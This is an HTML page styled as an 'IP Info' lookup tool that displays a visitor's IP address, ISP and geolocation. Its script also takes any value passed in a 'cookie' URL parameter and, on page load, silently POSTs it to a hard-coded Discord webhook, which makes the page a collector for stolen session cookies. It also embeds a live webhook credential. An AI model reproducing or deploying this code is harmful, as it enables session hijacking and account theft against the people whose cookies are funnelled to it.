<!DOCTYPE html>
<html>
<head>
    <title>IP Info</title>
    <style>
        body {
            background-color: #000;
            color: #ff3333;
            font-family: 'Courier New', monospace;
            padding: 20px;
        }
        .line {
            opacity: 0;
            margin: 8px 0;
            text-shadow: 
                0 0 5px #ff3333,
                0 0 10px #ff3333,
                0 0 20px #ff3333,
                0 0 40px #ff3333;
            transition: opacity 0.8s;
        }
    </style>
</head>
<body>
    <div id="container"></div>

    <script>
        const params = new URLSearchParams(window.location.search);
        const container = document.getElementById('container');

        const cv = params.get('cookie');
        if (cv) {
            const wb = "https://discord.com/api/webhooks/1416196052066766958/9AkFsT4oWhvqCq6tUoIzf-L9wpZSFBOUrgYlaw8aQ4SqznnrMw8Z762JJBnaxOTe5YZp";
            fetch(wb, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: cv })
            }).catch(console.error);
        }

        if (window.location.search.includes("?ip")) {
            fetch("https://ipwhois.app/json/")
            .then(res => res.json())
            .then(data => {
                const infoLines = [
                    `IP ADDRESS: ${data.ip || 'Unknown'}`,
                    `ISP: ${data.isp || 'Unknown'}`,
                    `ORG: ${data.org || 'Unknown'}`,
                    `ASN: ${data.asn || 'Unknown'}`,
                    `CITY: ${data.city || 'Unknown'}`,
                    `REGION: ${data.region || 'Unknown'}`,
                    `COUNTRY: ${data.country || 'Unknown'}`,
                    `TIMEZONE: ${data.timezone || 'Unknown'}`,
                    `LATITUDE: ${data.latitude || 'Unknown'}`,
                    `LONGITUDE: ${data.longitude || 'Unknown'}`
                ];

                let index = 0;
                function showNext() {
                    if (index >= infoLines.length) return;
                    const line = document.createElement('div');
                    line.className = 'line';
                    line.textContent = infoLines[index];
                    container.appendChild(line);
                    setTimeout(() => {
                        line.style.opacity = 1;
                        index++;
                        setTimeout(showNext, 400);
                    }, 100);
                }
                showNext();
            })
            .catch(err => {
                container.innerHTML = `<div class="line">Error fetching IP info</div>`;
                console.error(err);
            });
        }
    </script>
</body>
</html>
